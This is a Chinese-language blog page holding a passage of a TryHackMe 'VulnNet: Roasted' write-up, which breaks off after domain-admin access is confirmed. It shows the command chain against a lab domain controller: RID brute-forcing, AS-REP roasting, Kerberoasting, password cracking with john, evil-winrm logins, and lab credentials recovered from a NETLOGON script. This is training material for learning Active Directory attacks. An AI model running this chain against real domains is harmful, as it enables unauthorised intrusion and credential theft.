@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_VulnNet_Roasted | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="VulnNet: Roasted信息收集端口扫描   序号 Host地址 端口 协议 说明    1 10.48.132.165 53 DNS 域 DNS 服务   2 10.48.132.165 88 Kerberos KDC 认证服务   3 10.48.132.165 135 RPC Windows RPC   4 10.48.132.165 139 NetBIOS NetBIOS 会话服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_VulnNet_Roasted">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_VulnNet_Roasted.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="VulnNet: Roasted信息收集端口扫描   序号 Host地址 端口 协议 说明    1 10.48.132.165 53 DNS 域 DNS 服务   2 10.48.132.165 88 Kerberos KDC 认证服务   3 10.48.132.165 135 RPC Windows RPC   4 10.48.132.165 139 NetBIOS NetBIOS 会话服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-23T12:04:22.482Z">
+<meta property="article:modified_time" content="2026-06-22T14:03:45.238Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="medium">
+<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="域控">
+<meta property="article:tag" content="AS-REP Roasting">
+<meta property="article:tag" content="Kerberoasting">
+<meta property="article:tag" content="DCSync">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Kerberos">
+<meta property="article:tag" content="impacket">
+<meta property="article:tag" content="evil-winrm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_VulnNet_Roasted.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_VulnNet_Roasted',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-22 22:03:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">134</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_VulnNet_Roasted</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-23T12:04:22.482Z" title="发表于 2026-06-23 20:04:22">2026-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-22T14:03:45.238Z" title="更新于 2026-06-22 22:03:45">2026-06-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_VulnNet_Roasted"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="VulnNet-Roasted"><a href="#VulnNet-Roasted" class="headerlink" title="VulnNet: Roasted"></a>VulnNet: Roasted</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><table>
+<thead>
+<tr>
+<th align="left">序号</th>
+<th align="left">Host地址</th>
+<th align="left">端口</th>
+<th align="left">协议</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">10.48.132.165</td>
+<td align="left">53</td>
+<td align="left">DNS</td>
+<td align="left">域 DNS 服务</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">10.48.132.165</td>
+<td align="left">88</td>
+<td align="left">Kerberos</td>
+<td align="left">KDC 认证服务</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">10.48.132.165</td>
+<td align="left">135</td>
+<td align="left">RPC</td>
+<td align="left">Windows RPC</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="left">10.48.132.165</td>
+<td align="left">139</td>
+<td align="left">NetBIOS</td>
+<td align="left">NetBIOS 会话服务</td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="left">10.48.132.165</td>
+<td align="left">389</td>
+<td align="left">LDAP</td>
+<td align="left">目录服务</td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="left">10.48.132.165</td>
+<td align="left">445</td>
+<td align="left">SMB</td>
+<td align="left">文件共享</td>
+</tr>
+<tr>
+<td align="left">7</td>
+<td align="left">10.48.132.165</td>
+<td align="left">464</td>
+<td align="left">Kpasswd</td>
+<td align="left">Kerberos 密码修改</td>
+</tr>
+<tr>
+<td align="left">8</td>
+<td align="left">10.48.132.165</td>
+<td align="left">593</td>
+<td align="left">NCACN-HTTP</td>
+<td align="left">RPC over HTTP</td>
+</tr>
+<tr>
+<td align="left">9</td>
+<td align="left">10.48.132.165</td>
+<td align="left">636</td>
+<td align="left">LDAPS</td>
+<td align="left">LDAP over SSL</td>
+</tr>
+<tr>
+<td align="left">10</td>
+<td align="left">10.48.132.165</td>
+<td align="left">3268</td>
+<td align="left">GC LDAP</td>
+<td align="left">全局目录 LDAP</td>
+</tr>
+<tr>
+<td align="left">11</td>
+<td align="left">10.48.132.165</td>
+<td align="left">3269</td>
+<td align="left">GC LDAPS</td>
+<td align="left">全局目录 LDAPS</td>
+</tr>
+<tr>
+<td align="left">12</td>
+<td align="left">10.48.132.165</td>
+<td align="left">5985</td>
+<td align="left">WinRM</td>
+<td align="left">Windows 远程管理（HTTP）</td>
+</tr>
+<tr>
+<td align="left">13</td>
+<td align="left">10.48.132.165</td>
+<td align="left">9389</td>
+<td align="left">ADWS</td>
+<td align="left">Active Directory Web 服务</td>
+</tr>
+</tbody></table>
+<p><strong>关键发现</strong>：典型的 Windows 域控端口组合（Kerberos 88 + LDAP 389 + DNS 53 + SMB 445 + WinRM 5985），域名 <strong>VULNNET-RST</strong>。</p>
+<h3 id="RPC-枚举（受限）"><a href="#RPC-枚举（受限）" class="headerlink" title="RPC 枚举（受限）"></a>RPC 枚举（受限）</h3><p>尝试使用 <code>rpcclient</code> 连接 RPC 服务，枚举用户被拒绝：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# rpcclient -U &quot;&quot; 10.48.132.165 -N</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">result was NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; lsaquery</span><br><span class="line">Domain Name: VULNNET-RST</span><br><span class="line">Domain Sid: S-1-5-21-1589833671-435344116-4136949213</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; lookupsids S-1-5-21-1589833671-435344116-4136949213-500</span><br><span class="line">result was NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>匿名 RPC 用户枚举被拒绝，但成功获取了<strong>域名</strong>和<strong>域 SID</strong>。</p>
+</blockquote>
+<h3 id="SMB-共享枚举"><a href="#SMB-共享枚举" class="headerlink" title="SMB 共享枚举"></a>SMB 共享枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# smbclient -L //10.48.132.165</span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share</span><br><span class="line">SYSVOL          Disk      Logon server share</span><br><span class="line">VulnNet-Business-Anonymous Disk   VulnNet Business Sharing</span><br><span class="line">VulnNet-Enterprise-Anonymous Disk  VulnNet Enterprise Sharing</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现两个匿名可访问的自定义共享，以及标准域共享 NETLOGON&#x2F;SYSVOL。</p>
+</blockquote>
+<h2 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h2><h3 id="RID-暴力枚举"><a href="#RID-暴力枚举" class="headerlink" title="RID 暴力枚举"></a>RID 暴力枚举</h3><p>由于 IPC$ 可读，利用 impacket 的 <code>lookupsid</code> 脚本通过 SID 枚举有效域用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# impacket-lookupsid anonymous@10.48.132.165 -no-pass | tee usernames</span><br><span class="line">[*] Brute forcing SIDs at 10.48.132.165</span><br><span class="line">[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213</span><br><span class="line">498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: VULNNET-RST\Administrator (SidTypeUser)</span><br><span class="line">501: VULNNET-RST\Guest (SidTypeUser)</span><br><span class="line">502: VULNNET-RST\krbtgt (SidTypeUser)</span><br><span class="line">...</span><br><span class="line">1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)</span><br><span class="line">1105: VULNNET-RST\a-whitehat (SidTypeUser)</span><br><span class="line">1109: VULNNET-RST\t-skid (SidTypeUser)</span><br><span class="line">1110: VULNNET-RST\j-goldenhand (SidTypeUser)</span><br><span class="line">1111: VULNNET-RST\j-leet (SidTypeUser)</span><br></pre></td></tr></table></figure>
+
+<h3 id="提取用户名列表"><a href="#提取用户名列表" class="headerlink" title="提取用户名列表"></a>提取用户名列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─<span class="comment"># grep &quot;SidTypeUser&quot; usernames | awk -F&#x27;\\\\&#x27; &#x27;&#123;print $2&#125;&#x27; | awk -F&#x27; &#x27; &#x27;&#123;print $1&#125;&#x27; | tee userlist</span></span><br><span class="line"></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">WIN-2BO8M1OE1M1$</span><br><span class="line">enterprise-core-vn</span><br><span class="line">a-whitehat</span><br><span class="line">t-skid</span><br><span class="line">j-goldenhand</span><br><span class="line">j-leet</span><br></pre></td></tr></table></figure>
+
+<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当域用户账户被设置了 <strong>“不需要 Kerberos 预身份验证”（UF_DONT_REQUIRE_PREAUTH）</strong> 权限时，攻击者可以在不提供密码的情况下请求该用户的 AS-REP 票据，并从中离线破解密码哈希。这是一个常见的域配置错误——通常是为了兼容某些不支持 Kerberos 预认证的老旧应用而设置，但会导致账户面临离线破解风险。</p>
+<h3 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h3><p>使用 impacket 的 <code>GetNPUsers</code> 验证哪些用户启用了此选项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# impacket-GetNPUsers -dc-ip 10.48.132.165 VULNNET-RST/ -no-pass -usersfile userlist</span><br><span class="line">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User Guest doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] User enterprise-core-vn doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User a-whitehat doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$t-skid@VULNNET-RST:3d207fd99d2aa78cb13a18e10c51e0d7$d39888e55f7626ca421...</span><br><span class="line">[-] User j-goldenhand doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User j-leet doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>只有 <strong>t-skid</strong> 启用了不需要预身份验证，成功获取 AS-REP 哈希。</p>
+</blockquote>
+<h3 id="破解哈希"><a href="#破解哈希" class="headerlink" title="破解哈希"></a>破解哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hash</span><br><span class="line">tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)</span><br><span class="line">1g 0:00:00:04 DONE</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>t-skid</strong> 的密码：<code>tj072889*</code></p>
+</blockquote>
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>拥有有效域凭据后，可以请求域中注册了 <strong>SPN（服务主体名称）</strong> 的服务账户的 TGS 票据。该 TGS 票据使用服务账户的 NTLM 哈希加密（在 RC4 模式下），可以被离线暴力破解。与 AS-REP Roasting 不同，Kerberoasting 需要已认证的用户身份，但能攻击任何注册了 SPN 的服务账户——而 SPN 是服务账户的固有属性，无法轻易移除。</p>
+<h3 id="执行攻击-1"><a href="#执行攻击-1" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# impacket-GetUserSPNs -dc-ip 10.48.132.165 vulnnet-rst.local/t-skid:tj072889* -outputfile kerberoast_hash</span><br><span class="line"></span><br><span class="line">ServicePrincipalName    Name                MemberOf</span><br><span class="line">----------------------  ------------------  -------------------------------------------------------------</span><br><span class="line">CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现服务账户 <strong>enterprise-core-vn</strong>，关联 SPN 为 <code>CIFS/vulnnet-rst.local</code>。该账户同时属于 <strong>Remote Management Users</strong> 组，意味着可以通过 WinRM 远程登录。</p>
+</blockquote>
+<h3 id="破解-TGS-哈希"><a href="#破解-TGS-哈希" class="headerlink" title="破解 TGS 哈希"></a>破解 TGS 哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cat kerberoast_hash</span><br><span class="line">$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*...</span><br><span class="line"></span><br><span class="line">└─# john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hash</span><br><span class="line">ry=ibfkfv,s6h,   (enterprise-core-vn)</span><br><span class="line">1g 0:00:00:03 DONE</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>enterprise-core-vn</strong> 的密码：<code>ry=ibfkfv,s6h,</code></p>
+</blockquote>
+<h2 id="WinRM-登录"><a href="#WinRM-登录" class="headerlink" title="WinRM 登录"></a>WinRM 登录</h2><p>使用破解的凭据通过 WinRM（5985 端口）远程登录 Windows 系统。enterprise-core-vn 属于 Remote Management Users 组，因此有权限使用 WinRM：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# evil-winrm -i 10.48.132.165 -u enterprise-core-vn -p &#x27;ry=ibfkfv,s6h,&#x27;</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        3/13/2021   3:43 PM             39 user.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>成功获取 <strong>user.txt</strong>！</p>
+</blockquote>
+<h2 id="提权：域管接管"><a href="#提权：域管接管" class="headerlink" title="提权：域管接管"></a>提权：域管接管</h2><h3 id="SMB-共享中发现凭据"><a href="#SMB-共享中发现凭据" class="headerlink" title="SMB 共享中发现凭据"></a>SMB 共享中发现凭据</h3><p>使用 enterprise-core-vn 的凭据访问 NETLOGON 共享，发现密码重置 VBS 脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# smbclient //10.48.132.165/NETLOGON -U enterprise-core-vn%&#x27;ry=ibfkfv,s6h,&#x27;</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  ResetPassword.vbs     A     2821  Wed Mar 17 07:18:14 2021</span><br><span class="line"></span><br><span class="line">smb: \&gt; get ResetPassword.vbs</span><br></pre></td></tr></table></figure>
+
+<p>查看脚本内容，发现<strong>明文凭据</strong>：</p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strUserNTName = <span class="string">&quot;a-whitehat&quot;</span></span><br><span class="line">strPassword = <span class="string">&quot;bNdKVkjv3RR9ht&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 NETLOGON 共享的密码重置脚本中发现 <strong>a-whitehat</strong> 的密码：<code>bNdKVkjv3RR9ht</code></p>
+</blockquote>
+<h3 id="确认域管权限"><a href="#确认域管权限" class="headerlink" title="确认域管权限"></a>确认域管权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# evil-winrm -i 10.48.132.165 -u &#x27;a-whitehat&#x27; -p &#x27;bNdKVkjv3RR9ht&#x27;</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\a-whitehat\Desktop&gt; whoami /groups</span><br><span class="line">VULNNET-RST\Domain Admins    ← 域管理员组成员</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\a-whitehat\Desktop&gt; net group &quot;Domain Admins&quot; /domain</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            a-whitehat</span><br></pre></td></tr></table></figure>
+
+<blockquote>
